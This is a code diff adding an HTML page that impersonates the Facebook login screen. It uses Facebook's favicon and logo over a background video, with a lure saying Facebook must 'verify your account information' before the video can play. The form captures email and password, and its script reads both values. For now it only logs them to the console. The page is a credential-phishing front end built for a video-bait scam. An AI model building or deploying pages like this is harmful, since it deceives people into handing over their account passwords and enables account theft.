@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <video id="backgroundVideo" autoplay muted loop playsinline>
+        <source src="background.mp4" type="video/mp4">
+    </video>
+
+    <div class="login-container">
+        <div class="login-card">
+            <img src="facebook.svg" alt="Facebook" class="facebook-logo">
+            
+            <div class="warning-message">
+                Facebook needs to verify your account information to allow access this video
+            </div>
+            
+            <form id="loginForm">
+                <input type="text" placeholder="Email or phone number" id="email" required>
+                <input type="password" placeholder="Password" id="password" required>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            
+            <a href="#" class="forgot-password">Forgot Password?</a>
+            
+            <div class="divider"></div>
+            
+            <button class="create-account-button">Create New Account</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const video = document.getElementById('backgroundVideo');
+            
+            video.play().catch(function(error) {
+                console.log("Video autoplay failed:", error);
+            });
+            
+            document.addEventListener('touchstart', function() {
+                video.play().catch(function(error) {
+                    console.log("Video autoplay failed after touch:", error);
+                });
+            }, { once: true });
+            
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                console.log('Login attempt:', { email, password });
+            });
+        });
+    </script>
+</body>
+</html>
